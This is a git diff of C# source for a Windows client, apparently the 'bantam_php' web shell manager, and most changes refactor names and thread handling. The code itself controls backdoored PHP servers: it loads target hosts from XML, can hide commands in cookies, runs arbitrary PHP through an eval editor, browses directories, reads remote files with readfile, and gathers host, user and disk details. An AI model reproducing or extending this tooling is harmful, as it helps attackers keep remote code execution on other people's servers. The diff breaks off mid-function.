@@ -1,16 +1,14 @@
 ﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Net;
 using System.Text;
+using System.Threading;
+using System.Web;
 using System.Windows.Forms;
 using System.Xml;
-using System.Net;
-using System.IO;
-using System.Diagnostics;
-using System.Collections;
-using System.Collections.Generic;
-using System.Web;
-using System.Text.RegularExpressions;
-using System.Threading;
-using System.Linq;
 
 namespace bantam_php
 {
@@ -24,12 +22,12 @@ namespace bantam_php
         /// <summary>
         /// 
         /// </summary>
-        public string target;
+        public String g_SelectedTarget;
 
         /// <summary>
         /// 
         /// </summary>
-        public Dictionary<string, ClientInfo> Clients = new Dictionary<string, ClientInfo>();
+        public Dictionary<String, HostInfo> Clients = new Dictionary<String, HostInfo>();
 
         /// <summary>
         /// Main Form Constructor, performs the initialization routine, and requests some basic information about every server provided
@@ -38,12 +36,19 @@ namespace bantam_php
         public BantamMain()
         {
             InitializeComponent();
+            loadhostTargetsFromXML();
+        }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        public void loadhostTargetsFromXML(string xmlFile = CONFIG_FILE)
+        {
             //check if config file exists, proceed to load it and select the "servers" into an XmlNodeList
-            if (File.Exists(CONFIG_FILE))
+            if (File.Exists(xmlFile))
             {
                 XmlDocument xmlDoc = new XmlDocument();
-                xmlDoc.Load(CONFIG_FILE);
+                xmlDoc.Load(xmlFile);
 
                 XmlNodeList itemNodes = xmlDoc.SelectNodes("//servers/server");
 
@@ -52,41 +57,40 @@ namespace bantam_php
                     //loop through every server
                     foreach (XmlNode itemNode in itemNodes)
                     {
+                        //TODO abstract this into process function(s)
                         //Hot select target onload up
-                        string host = (itemNode.Attributes["host"] != null) ? itemNode?.Attributes?["host"].Value : "";
-                        string requestArg = (itemNode.Attributes["request_arg"] != null) ? itemNode?.Attributes?["request_arg"].Value : "";
-                        string requestMethod = (itemNode?.Attributes?["request_method"] != null) ? itemNode?.Attributes?["request_method"].Value : "";
+                        string hostTarget = (itemNode.Attributes?["host"] != null) ? itemNode.Attributes?["host"].Value : "";
+                        string requestArg = (itemNode.Attributes?["request_arg"] != null) ? itemNode.Attributes?["request_arg"].Value : "";
+                        string requestMethod = (itemNode.Attributes?["request_method"] != null) ? itemNode.Attributes?["request_method"].Value : "";
 
-                        //invalid host/target name
-                        if (string.IsNullOrEmpty(host))
+                        //invalid hostTarget/target name
+                        if (string.IsNullOrEmpty(hostTarget))
                         {
                             continue;
                         }
-                        //add the host to our client class containing infos
-                        Clients.Add(host, new ClientInfo());
+                        //add the hostTarget to our client class containing infos
+                        Clients.Add(hostTarget, new HostInfo());
 
                         //if the request arg is specified in the XML and not set to command
                         if (string.IsNullOrEmpty(requestArg) == false
                         && requestArg != "command")
                         {
-                            Clients[host].RequestArgName = requestArg;
+                            Clients[hostTarget].RequestArgName = requestArg;
                         }
 
                         //if the request method is specified in the XML and set to cookie
                         if (string.IsNullOrEmpty(requestMethod) == false
                          && requestMethod == "cookie")
                         {
-                            Clients[host].SendDataViaCookie = true;
+                            Clients[hostTarget].SendDataViaCookie = true;
                         }
 
-                        //execute ping on current host iteration
-                        Thread t = new Thread(getInitDataThread);
-                        t.Start(host);
+                        //execute ping on current hostTarget iteration
+                        Thread t = new Thread(() => getInitDataThread(hostTarget));
+                        t.Start();
                     }
                 }
-            } 
-            else
-            {
+            } else {
                 MessageBox.Show("Config file (" + CONFIG_FILE + ") is missing.", "Oh... Shied..");
             }
         }
@@ -97,9 +101,9 @@ namespace bantam_php
         /// <returns></returns>
         public bool validTarget()
         {
-            if (string.IsNullOrEmpty(target) == false)
+            if (string.IsNullOrEmpty(g_SelectedTarget) == false)
             {
-                if (Clients[target].Down == false)
+                if (Clients[g_SelectedTarget].Down == false)
                 {
                     return true;
                 }
@@ -108,36 +112,19 @@ namespace bantam_php
         }
 
         //These are called/invoked when a thread needs to modify a UI element that exists in the main thread.
-        #region THREAD_SAFE_GUI_CALLBACKS
+        #region THREAD_SAFE_DELEGATE_CALLBACKS
 
         /// <summary>
         /// 
         /// </summary>
-        /// <param name="title"></param>
-        /// <param name="text"></param>
-        public delegate void guiHelperRichTextboxPromptDelegate(string title, string text);
-        public void guiHelperRichTextBoxPromptMethod(string title, string text)
-        {
-            if (this.InvokeRequired)
-            {
-                this.Invoke(new guiHelperRichTextboxPromptDelegate(guiHelperRichTextBoxPromptMethod), new Object[] { title, text });
-                return;
-            }
-            DynamicPrompts.RichTextBoxDialog(title, text);
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="host"></param>
+        /// <param name="hostTarget"></param>
         /// <param name="pingMS"></param>
-        /// <param name="windows"></param>
-        public delegate void addClientDelegate(string host, string pingMS);
-        public void addClientMethod(string host, string pingMS)
+        public delegate void addClientDelegate(string hostTarget, string pingMS);
+        public void addClientMethod(string hostTarget, string pingMS)
         {
             if (this.InvokeRequired)
             {
-                this.Invoke(new addClientDelegate(addClientMethod), new Object[] { host, pingMS });
+                this.Invoke(new addClientDelegate(addClientMethod), new object[] { hostTarget, pingMS });
                 return;
             }
 
@@ -145,15 +132,14 @@ namespace bantam_php
             //TODO either do not add them to the listview or add them add red with a NA ping, and the ability to re-ping (fix) them
             if (pingMS == "-")
             {
-                listViewClients.Items.Add(new ListViewItem(new string[] { host, pingMS }));
+                listViewClients.Items.Add(new ListViewItem(new string[] { hostTarget, pingMS }));
+
                 int lastIndex = listViewClients.Items.Count - 1;
                 listViewClients.Items[lastIndex].BackColor = System.Drawing.Color.Red;
 
-                Clients[host].Down = true;
-            }
-            else
-            {
-                listViewClients.Items.Add(new ListViewItem(new string[] { host, pingMS + " ms" }));
+                Clients[hostTarget].Down = true;
+            } else {
+                listViewClients.Items.Add(new ListViewItem(new string[] { hostTarget, pingMS + " ms" }));
             }
         }
 
@@ -170,16 +156,12 @@ namespace bantam_php
                 return;
             }
 
-            if (arg != null)
-            {
-                object[] objects = (object[])arg;
+            object[] objects = (object[])arg;
+            ListViewItem lvi = (ListViewItem)objects[0];
+            string hostTarget = (string)objects[1];
 
-                ListViewItem lvi = (ListViewItem)objects[0];
-                string multithreadSafeTarget = (string)objects[1];
-
-                lvi.SubItems[1].Text = Clients[multithreadSafeTarget].PingStopwatch.ElapsedMilliseconds.ToString() + " ms";
-                Clients[multithreadSafeTarget].PingStopwatch.Stop();
-            }
+            lvi.SubItems[1].Text = Clients[hostTarget].PingStopwatch.ElapsedMilliseconds.ToString() + " ms";
+            Clients[hostTarget].PingStopwatch.Stop();
         }
 
         /// <summary>
@@ -264,20 +246,20 @@ namespace bantam_php
 
                 if (string.IsNullOrEmpty(result) == false)
                 {
-                    string[] rows = result.Split(new string[] { PHP_Helper.rowSeperator }, StringSplitOptions.None);
+                    string[] rows = result.Split(new string[] { PHP.rowSeperator }, StringSplitOptions.None);
 
                     if (rows.Length > 0 && rows != null)
                     {
                         foreach (string row in rows)
                         {
-                            string[] columns = row.Split(new string[] { PHP_Helper.colSeperator }, StringSplitOptions.None);
+                            string[] columns = row.Split(new string[] { PHP.colSeperator }, StringSplitOptions.None);
 
                             if (columns != null && columns.Length - 2 > 0)
                             {
                                 if (columns[columns.Length - 2] == "dir")
                                 {
                                     //if the user switched targets we do not update the live filebrowser because it is for a different target
-                                    if (hostTarget == target)
+                                    if (hostTarget == g_SelectedTarget)
                                     {
                                         TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 0);
                                         lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
@@ -286,10 +268,8 @@ namespace bantam_php
                                         {
                                             lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                         }
-                                    }
-                                    else
-                                    {
-                                        //the user changed "host/targets" before the call back so we add it into their client cache instead of the live treeview
+                                    } else {
+                                        //the user changed "hostTarget/targets" before the call back so we add it into their client cache instead of the live treeview
                                         TreeNode lastTn = Clients[hostTarget].Files.Nodes.Add("", columns[0], 0);
                                         lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
 
@@ -298,11 +278,9 @@ namespace bantam_php
                                             lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                         }
                                     }
-                                }
-                                else
-                                {
+                                } else {
                                     //if the user switched targets we do not update the live filebrowser because it is for a different target
-                                    if (hostTarget == target)
+                                    if (hostTarget == g_SelectedTarget)
                                     {
                                         TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 6);
                                         lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
@@ -311,10 +289,8 @@ namespace bantam_php
                                         {
                                             lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                         }
-                                    }
-                                    else
-                                    {
-                                        //the user changed "host/targets" before the call back so we add it into their client cache instead of the live treeview
+                                    } else {
+                                        //the user changed "hostTarget/targets" before the call back so we add it into their client cache instead of the live treeview
                                         TreeNode lastTn = Clients[hostTarget].Files.Nodes.Add("", columns[0], 6);
                                         lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
 
@@ -356,7 +332,7 @@ namespace bantam_php
                     Clients[hostTarget].Files.Nodes.Clear();
 
                     //if user didn't switch targets by the time this callback is triggered clear the live treeview
-                    if (target == hostTarget)
+                    if (g_SelectedTarget == hostTarget)
                     {
                         treeViewFileBrowser.Nodes.Clear();
                         treeViewFileBrowser.Refresh();
@@ -371,20 +347,20 @@ namespace bantam_php
 
                     if (result != null && result.Length > 0)
                     {
-                        string[] rows = result.Split(new string[] { PHP_Helper.rowSeperator }, StringSplitOptions.None);
+                        string[] rows = result.Split(new string[] { PHP.rowSeperator }, StringSplitOptions.None);
 
                         if (rows.Length > 0 && rows != null)
                         {
                             foreach (string row in rows)
                             {
-                                string[] columns = row.Split(new string[] { PHP_Helper.colSeperator }, StringSplitOptions.None);
+                                string[] columns = row.Split(new string[] { PHP.colSeperator }, StringSplitOptions.None);
 
                                 if (columns != null && columns.Length - 2 > 0)
                                 {
                                     if (columns[columns.Length - 2] == "dir")
                                     {
                                         //if the user switched targets we do not update the live filebrowser because it is for a different target
-                                        if (target == hostTarget)
+                                        if (g_SelectedTarget == hostTarget)
                                         {
                                             TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 0);
                                             lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
@@ -393,10 +369,8 @@ namespace bantam_php
                                             {
                                                 lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                             }
-                                        }
-                                        else
-                                        {
-                                            //the user changed "host/targets" before the call back so we add it into their client cache instead of the live treeview
+                                        } else {
+                                            //the user changed "hostTarget/targets" before the call back so we add it into their client cache instead of the live treeview
                                             TreeNode lastTn = Clients[hostTarget].Files.Nodes.Add("", columns[0], 0);
                                             lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
 
@@ -405,11 +379,9 @@ namespace bantam_php
                                                 lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                             }
                                         }
-                                    }
-                                    else
-                                    {
+                                    } else {
                                         //if the user switched targets we do not update the live filebrowser because it is for a different target
-                                        if (target == hostTarget)
+                                        if (g_SelectedTarget == hostTarget)
                                         {
                                             TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 6);
                                             lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
@@ -418,10 +390,8 @@ namespace bantam_php
                                             {
                                                 lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                             }
-                                        } 
-                                        else
-                                        {
-                                            //the user changed "host/targets" before the call back so we add it into their client cache instead of the live treeview
+                                        } else {
+                                            //the user changed "hostTarget/targets" before the call back so we add it into their client cache instead of the live treeview
                                             TreeNode lastTn = Clients[hostTarget].Files.Nodes.Add("", columns[0], 6);
                                             lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
 
@@ -461,20 +431,20 @@ namespace bantam_php
 
                 if (string.IsNullOrEmpty(result) == false)
                 {
-                    string[] rows = result.Split(new string[] { PHP_Helper.rowSeperator }, StringSplitOptions.None);
+                    string[] rows = result.Split(new string[] { PHP.rowSeperator }, StringSplitOptions.None);
 
                     if (rows.Length > 0 && rows != null)
                     {
                         foreach (string row in rows)
                         {
-                            string[] columns = row.Split(new string[] { PHP_Helper.colSeperator }, StringSplitOptions.None);
+                            string[] columns = row.Split(new string[] { PHP.colSeperator }, StringSplitOptions.None);
 
                             if (columns != null && columns.Length - 2 > 0)
                             {
                                 if (columns[columns.Length - 2] == "dir")
                                 {
                                     //if the user switched targets we do not update the live filebrowser because it is for a different target
-                                    if (hostTarget == target)
+                                    if (hostTarget == g_SelectedTarget)
                                     {
                                         TreeNode lastTn = tn.Nodes.Add("", columns[0], 0);
                                         lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
@@ -483,31 +453,23 @@ namespace bantam_php
                                         {
                                             lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                         }
-                                    }
-                                    else
-                                    {
+                                    } else {
                                         //TODO update their client cache here user changed clients
                                     }
-                                }
-                                else
-                                {
+                                } else {
                                     //if the user switched targets we do not update the live filebrowser because it is for a different target
-                                    if (hostTarget == target)
+                                    if (hostTarget == g_SelectedTarget)
                                     {
                                         TreeNode lastTn = tn.Nodes.Add("", columns[0], 6);
                                         if (string.IsNullOrEmpty(columns[2]) == false)
                                         {
                                             lastTn.ToolTipText = GUI_Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                         }
-                                    }
-                                    else
-                                    {
+                                    } else {
                                         //TODO update their client cache here user changed clients
                                     }
                                 }
-                            }
-                            else
-                            {
+                            } else {
                                 //MessageBox.Show(columns[0]);
                             }
                         }
@@ -524,90 +486,92 @@ namespace bantam_php
         /// <summary>
         /// 
         /// </summary>
-        /// <param name="target"></param>
-        /// <param name="code"></param>
+        /// <param name="Code"></param>
+        /// <param name="Callback"></param>
+        /// <param name="CallbackArgs"></param>
+        private void startPhpExecutionThread(string phpCode, Action<object> callback = null, object[] callbackArgs = null)
+        {
+            string hostTarget = g_SelectedTarget;
+
+            Thread t = new Thread(dynamicRequestThread);
+            t.Start(new DynamicThreadArgs(hostTarget, phpCode, callback, callbackArgs));
+        }
+
+        /// <summary>
+        /// Starts a thread that executes the php code
+        /// </summary>
+        /// <param name="phpCode"></param>
         /// <param name="title"></param>
-        public void startRichTextBoxThread(string code, string title)
+        public void startRichtextboxThread(string phpCode, string title)
         {
             if (validTarget() == false)
             {
                 return;
             }
 
-            Thread t = new Thread(this.richTextboxDialogThread);
-            t.Start(new string[] { target, code, title });
+            string hostTarget = g_SelectedTarget;
+            var t = new Thread(() => richTextboxDialogThread(hostTarget, phpCode, title));
+            t.Start();
         }
+
 
         /// <summary>
         /// 
         /// </summary>
-        /// <param name="data"></param>
-        public void richTextboxDialogThread(object data)
+        /// <param name="hostTarget"></param>
+        /// <param name="phpCode"></param>
+        /// <param name="title"></param>
+        public void richTextboxDialogThread(string hostTarget, string phpCode, string title)
         {
-            if (data is Array && ((Array)data).Length == 3)
-            {
-                string[] requestData = (string[])data;
-                string resultTxt = executePHP((string)requestData[0], (string)requestData[1]);
+            string resultTxt = executePHP(hostTarget, phpCode);
 
-                if (string.IsNullOrEmpty(resultTxt) == false)
-                {
-                    DynamicPrompts.RichTextBoxDialog((string)requestData[2], resultTxt);
-                }
-                else
-                {
-                    //TODO if (cfg messageboxes)
-                    MessageBox.Show("No Data Returned", "Welp...");
-                }
-            }
-            else
+            if (string.IsNullOrEmpty(resultTxt) == false)
             {
-                MessageBox.Show("Invalid Argument Count - richTextboxDialogThread", "ERROR");
+                CustomForms.RichTextBoxDialog(title, resultTxt);
+            } else {
+                //TODO if (cfg messageboxes)
+                MessageBox.Show("No Data Returned", "Welp...");
             }
         }
 
         /// <summary>
         /// 
         /// </summary>
-        /// <returns></returns>
-        public void getInitDataThread(object host)
+        /// <param name="hostTarget"></param>
+        public void getInitDataThread(string hostTarget)
         {
-            if (string.IsNullOrEmpty(host.ToString()) == false)
+            if (string.IsNullOrEmpty(hostTarget.ToString()) == false)
             {
                 //start stopwatch for ping/estimated average response time
                 Stopwatch pingWatch = new Stopwatch();
                 pingWatch.Start();
 
-                string result = executePHP((string)host, PHP_Helper.initDataVars);
+                string result = executePHP(hostTarget, PHP.initDataVars);
 
                 if (string.IsNullOrEmpty(result) == false)
                 {
                     string[] data = { null };
-                    data = result.Split(new string[] { PHP_Helper.colSeperator }, StringSplitOptions.None);
+                    data = result.Split(new string[] { PHP.colSeperator }, StringSplitOptions.None);
 
-                    var initDataReturnedVarCount = Enum.GetValues(typeof(PHP_Helper.INIT_DATA_VARS)).Cast<PHP_Helper.INIT_DATA_VARS>().Max();
+                    var initDataReturnedVarCount = Enum.GetValues(typeof(PHP.INIT_DATA_VARS)).Cast<PHP.INIT_DATA_VARS>().Max();
 
                     if (data != null && data.Length == (int)initDataReturnedVarCount + 1)
                     {
                         //invokes a thread safe call from the GUI thread so we can safely update the GUI's listview
-                        addClientMethod((string)host, pingWatch.ElapsedMilliseconds.ToString());
+                        addClientMethod(hostTarget, pingWatch.ElapsedMilliseconds.ToString());
 
                         //add clients info to our local data handler
-                        Clients[(string)host].update(pingWatch.ElapsedMilliseconds, data);
+                        Clients[hostTarget].update(pingWatch.ElapsedMilliseconds, data);
+                    } else {
+                        addClientMethod(hostTarget, "-");
                     }
-                    else
-                    {
-                        addClientMethod((string)host, "-");
-                    }
-                }
-                else
-                {
-                    addClientMethod((string)host, "-");
+                } else {
+                    addClientMethod(hostTarget, "-");
                 }
                 pingWatch.Stop();
             }
         }
 
-        //delegate, with dynmaic thread safe GUI callback ::O
         /// <summary>
         /// 
         /// </summary>
@@ -620,19 +584,22 @@ namespace bantam_php
                 DynamicThreadArgs wrapperArgs = (DynamicThreadArgs)args;
 
                 //execute our request in our threads that runs asynchronously along side the GUI thread
-                string result = executePHP(wrapperArgs.target, wrapperArgs.code);
+                string result = executePHP(wrapperArgs.host, wrapperArgs.code);
 
                 if (string.IsNullOrEmpty(result) == false)
                 {
                     if (wrapperArgs.callbackArgs != null && wrapperArgs.callbackArgs.Length > 0)
                     {
-                        //TODO: fix these 3 ghetto lines of a hack used to put the result of the request into the existing wrapper callback args
+                        //TODO: make the following 3 lines suck less or not exist
+                        //appends the result of the php execution into the callback args for the callback function
                         object[] tmpCallbackArgs = wrapperArgs.callbackArgs;
                         Array.Resize(ref tmpCallbackArgs, wrapperArgs.callbackArgs.Length + 1);
                         tmpCallbackArgs[wrapperArgs.callbackArgs.Length] = result;
 
                         //Invoke the dynamic thread safe callback, with it's "object" of arguments
                         wrapperArgs.callback?.Invoke(tmpCallbackArgs);
+                    } else {
+                        wrapperArgs.callback?.Invoke(null);
                     }
                 }
             }
@@ -649,11 +616,12 @@ namespace bantam_php
         /// <param name="e"></param>
         private void getMyIPToolStripMenuItem_Click(object sender, EventArgs e)
         {
+            //todo use php >.>
             string remoteIP = this.makeRequest("http://ipv4.icanhazip.com/", "");
 
             if (string.IsNullOrEmpty(remoteIP) == false)
             {
-                MessageBox.Show(remoteIP, "Your IP Is");
+                MessageBox.Show(remoteIP, "Your IP is : ");
                 Clipboard.SetText(remoteIP);
             }
         }
@@ -671,20 +639,16 @@ namespace bantam_php
             }
 
             bool showResponse = false;
-            string code = DynamicPrompts.RichTextBoxEvalEditor("PHP Eval Editor - " + target, "", ref showResponse);
+            string code = CustomForms.RichTextBoxEvalEditor("PHP Eval Editor - " + g_SelectedTarget, "", ref showResponse);
 
             if (string.IsNullOrEmpty(code) == false)
             {
                 if(showResponse)
                 {
                     //execute the code and show it in a richtextbox
-                    startRichTextBoxThread(code, "PHP Eval Result - " + target);
-                }
-                else
-                {
-                    //execute the code and do not show the result
-                    Thread t = new Thread(new ParameterizedThreadStart(this.dynamicRequestThread));
-                    t.Start((object)DynamicThreadArgs.GetThreadArgs(target, code));
+                    startRichtextboxThread(code, "PHP Eval Result - " + g_SelectedTarget);
+                } else {
+                    startPhpExecutionThread(code);
                 }
             }
         }
@@ -704,18 +668,15 @@ namespace bantam_php
             ListViewItem lvi = GUI_Helper.GetFirstSelectedListview(listViewClients);
 
             if (lvi != null
-            && (Clients[target].PingStopwatch == null || Clients[target].PingStopwatch.IsRunning == false))
+            && (Clients[g_SelectedTarget].PingStopwatch == null 
+            || Clients[g_SelectedTarget].PingStopwatch.IsRunning == false))
             {
                 //start client stopwatch
-                Clients[target].PingStopwatch = new Stopwatch();
-                Clients[target].PingStopwatch.Start();
+                Clients[g_SelectedTarget].PingStopwatch = new Stopwatch();
+                Clients[g_SelectedTarget].PingStopwatch.Start();
 
-                //setup main thread
-                DynamicThreadArgs threadArgs = DynamicThreadArgs.GetThreadArgs(target, "echo '1';", new object[] { lvi, target }, guiCallbackUpdateListViewItemPing);
-
-                //start main thread
-                Thread t = new Thread(new ParameterizedThreadStart(this.dynamicRequestThread));
-                t.Start((object)threadArgs);
+                object[] callbackArgs = { lvi, g_SelectedTarget };
+                startPhpExecutionThread(PHP.phpTestExecutionWithEcho, guiCallbackUpdateListViewItemPing, callbackArgs);
             }
         }
 
@@ -732,15 +693,8 @@ namespace bantam_php
                 return;
             }
 
-            //setup main thread
-            DynamicThreadArgs threadArgs = new DynamicThreadArgs(target, 
-                                                                 PHP_Helper.getBasicCurl("http://redtube.com/"), 
-                                                                 guiCallbackBrowserViewMethod, 
-                                                                 new object[] { target });
-
-            //start main thread
-            Thread t = new Thread(new ParameterizedThreadStart(this.dynamicRequestThread));
-            t.Start((object)threadArgs);
+            //todo wtf is going on here with the browser view method, unametoolstrip click.. and no callback..
+            startPhpExecutionThread(PHP.getBasicCurl("http://youtube.com/"), guiCallbackBrowserViewMethod);
         }
 
 
@@ -756,12 +710,7 @@ namespace bantam_php
                 return;
             }
 
-            //setup main thread
-            DynamicThreadArgs threadArgs = new DynamicThreadArgs(target, "phpinfo();", guiCallbackBrowserViewMethod, new object[] { target });
-
-            //start main thread
-            Thread t = new Thread(new ParameterizedThreadStart(this.dynamicRequestThread));
-            t.Start((object)threadArgs);
+            startPhpExecutionThread(PHP.phpInfo, guiCallbackBrowserViewMethod);
         }
 
         /// <summary>
@@ -788,16 +737,17 @@ namespace bantam_php
                 if (treeViewFileBrowser.Nodes != null && treeViewFileBrowser.Nodes.Count > 0)
                 {
                     //Clear previously cached treeview to only store 1 copy
-                    if (!string.IsNullOrEmpty(target) && Clients[target].Files.Nodes.Count > 0)
+                    if (!string.IsNullOrEmpty(g_SelectedTarget)
+                    && Clients[g_SelectedTarget].Files.Nodes.Count > 0)
                     {
-                        Clients[target].Files.Nodes.Clear();
+                        Clients[g_SelectedTarget].Files.Nodes.Clear();
                     }
                     //store current treeview into client and clear
-                    GUI_Helper.CopyNodes(treeViewFileBrowser, Clients[target].Files);
+                    GUI_Helper.CopyNodes(treeViewFileBrowser, Clients[g_SelectedTarget].Files);
                     treeViewFileBrowser.Nodes.Clear();
                 }
 
-                target = lvi.SubItems[0].Text;
+                g_SelectedTarget = lvi.SubItems[0].Text;
 
                 //TODO: investigate - new possible issue
                 if (validTarget() == false)
@@ -816,27 +766,29 @@ namespace bantam_php
                     return;
                 }
 
-                lblDynCWD.Text = Clients[target].CWD;
-                lblDynFreeSpace.Text = !string.IsNullOrEmpty(Clients[target].FreeHDDSpace) ? GUI_Helper.FormatBytes(Convert.ToDouble(Clients[target].FreeHDDSpace)) : "0";
-                lblDynHDDSpace.Text = !string.IsNullOrEmpty(Clients[target].TotalHDDSpace) ? GUI_Helper.FormatBytes(Convert.ToDouble(Clients[target].TotalHDDSpace)) : "0";
-                lblDynServerIP.Text = Clients[target].IP;
-                lblDynUname.Text = Clients[target].UnameRelease + " " + Clients[target].UnameKernel;
-                lblDynUser.Text = Clients[target].UID + " ( " + Clients[target].User + " )";
-                lblDynWebServer.Text = Clients[target].ServerSoftware;
-                lblDynGroup.Text = Clients[target].GID + " ( " + Clients[target].Group + " )";
-                lblDynPHP.Text = Clients[target].PHP_Version;
+                lblDynCWD.Text = Clients[g_SelectedTarget].CWD;
+                lblDynFreeSpace.Text = string.IsNullOrEmpty(Clients[g_SelectedTarget].FreeHDDSpace) ? "0" 
+                                     : GUI_Helper.FormatBytes(Convert.ToDouble(Clients[g_SelectedTarget].FreeHDDSpace));
+
+                lblDynHDDSpace.Text = string.IsNullOrEmpty(Clients[g_SelectedTarget].TotalHDDSpace) ? "0" 
+                                    : GUI_Helper.FormatBytes(Convert.ToDouble(Clients[g_SelectedTarget].TotalHDDSpace));
+
+                lblDynServerIP.Text = Clients[g_SelectedTarget].IP;
+                lblDynUname.Text = Clients[g_SelectedTarget].UnameRelease + " " + Clients[g_SelectedTarget].UnameKernel;
+                lblDynUser.Text = Clients[g_SelectedTarget].UID + " ( " + Clients[g_SelectedTarget].User + " )";
+                lblDynWebServer.Text = Clients[g_SelectedTarget].ServerSoftware;
+                lblDynGroup.Text = Clients[g_SelectedTarget].GID + " ( " + Clients[g_SelectedTarget].Group + " )";
+                lblDynPHP.Text = Clients[g_SelectedTarget].PHP_Version;
 
                 if (tabControl1.SelectedTab == tabPageFiles)
                 {
-                    if (Clients[target].Files.Nodes != null
-                    && Clients[target].Files.Nodes.Count > 0)
+                    if (Clients[g_SelectedTarget].Files.Nodes != null
+                    && Clients[g_SelectedTarget].Files.Nodes.Count > 0)
                     {
-                        GUI_Helper.CopyNodes(Clients[target].Files, treeViewFileBrowser);
+                        GUI_Helper.CopyNodes(Clients[g_SelectedTarget].Files, treeViewFileBrowser);
                         treeViewFileBrowser.Refresh();
                         treeViewFileBrowser.ExpandAll();
-                    }
-                    else
-                    {
+                    } else {
                         start_FileBrowser();
                     }
                 }
@@ -859,16 +811,14 @@ namespace bantam_php
             {
                 //if the gui's treeview is empty and the cached treeview data is not empty
                 if (treeViewFileBrowser.Nodes.Count == 0 
-                && Clients[target].Files.Nodes != null
-                && Clients[target].Files.Nodes.Count > 0)
+                && Clients[g_SelectedTarget].Files.Nodes != null
+                && Clients[g_SelectedTarget].Files.Nodes.Count > 0)
                 {
                     //populate the treeview from cache
-                    GUI_Helper.CopyNodes(Clients[target].Files, treeViewFileBrowser);
+                    GUI_Helper.CopyNodes(Clients[g_SelectedTarget].Files, treeViewFileBrowser);
                     treeViewFileBrowser.Refresh();
                     treeViewFileBrowser.ExpandAll();
-                }
-                else
-                {
+                } else {
                     //if the gui treeview is empty, start the filebrowser and display it
                     if (treeViewFileBrowser.Nodes.Count == 0)
                     {
@@ -892,26 +842,14 @@ namespace bantam_php
                 return;
             }
 
-            txtBoxFileBrowserPath.Text = Clients[target].CWD;
-            if (Clients[target].Windows)
+            txtBoxFileBrowserPath.Text = Clients[g_SelectedTarget].CWD;
+
+            if (Clients[g_SelectedTarget].isWindows)
             {
-                //setup main thread
-                DynamicThreadArgs threadArgs = new DynamicThreadArgs(target, PHP_Helper.phpGetDrivesCode, fileBrowserWindowsStartMethod, new object[] { target });
-
-                //start main thread
-                Thread t = new Thread(new ParameterizedThreadStart(this.dynamicRequestThread));
-                t.Start((object)threadArgs);
-            }
-            else
-            {
-                string directoryContentsPHPCode = PHP_Helper.getDirectoryEnumerationCode(".", Clients[target].PHP_Version);
-
-                //setup main thread
-                DynamicThreadArgs threadArgs = new DynamicThreadArgs(target, directoryContentsPHPCode, fileBrowserLinuxStartMethod, new object[] { target });
-
-                //start main thread
-                Thread t = new Thread(new ParameterizedThreadStart(this.dynamicRequestThread));
-                t.Start((object)threadArgs);
+                startPhpExecutionThread(PHP.getHardDriveLetters, fileBrowserWindowsStartMethod);
+            } else {
+                string directoryContentsPHPCode = PHP.getDirectoryEnumerationCode(".", Clients[g_SelectedTarget].PHP_Version);
+                startPhpExecutionThread(directoryContentsPHPCode, fileBrowserLinuxStartMethod);
             }
 
             if (tabControl1.SelectedTab != tabPageFiles)
@@ -949,17 +887,15 @@ namespace bantam_php
                 //replace backslash from the treenode path to a proper forward slash
                 string path = tn.FullPath.Replace('\\', '/');
                 //Get Directory Contents PHP code
-                string directoryContentsPHPCode = PHP_Helper.getDirectoryEnumerationCode(path, Clients[target].PHP_Version);
+                string directoryContentsPHPCode = PHP.getDirectoryEnumerationCode(path, Clients[g_SelectedTarget].PHP_Version);
 
                 //attempts to execute the directoryContents PHP code on the "target"
 
                 //setup GUI callback to call after request
                 //setup main thread
-                DynamicThreadArgs threadArgs = new DynamicThreadArgs(target, directoryContentsPHPCode, fileBrowserMouseClickMethod, new object[] { target, tn });
-
-                //start main thread
-                Thread t = new Thread(new ParameterizedThreadStart(this.dynamicRequestThread));
-                t.Start((object)threadArgs);
+                object[] callbackParams = { g_SelectedTarget, tn };
+                
+                startPhpExecutionThread(directoryContentsPHPCode, fileBrowserMouseClickMethod, callbackParams);
             }
         }
 
@@ -987,9 +923,10 @@ namespace bantam_php
                 return;
             }
 
-            if (treeViewFileBrowser.Nodes != null && treeViewFileBrowser.Nodes.Count > 0)
+            if (treeViewFileBrowser.Nodes != null 
+             && treeViewFileBrowser.Nodes.Count > 0)
             {
-                Clients[target].Files.Nodes.Clear();
+                Clients[g_SelectedTarget].Files.Nodes.Clear();
                 treeViewFileBrowser.Nodes.Clear();
                 treeViewFileBrowser.Refresh();
             }
@@ -1019,8 +956,9 @@ namespace bantam_php
         private void readFileToolStripMenuItem_Click_1(object sender, EventArgs e)
         {
             string path = treeViewFileBrowser.SelectedNode.FullPath.Replace('\\', '/');
-            string code = "@readfile('" + path + "');";
-            startRichTextBoxThread(code, "Viewing File -" + path);
+            string phpCode = "@readfile('" + path + "');";
+
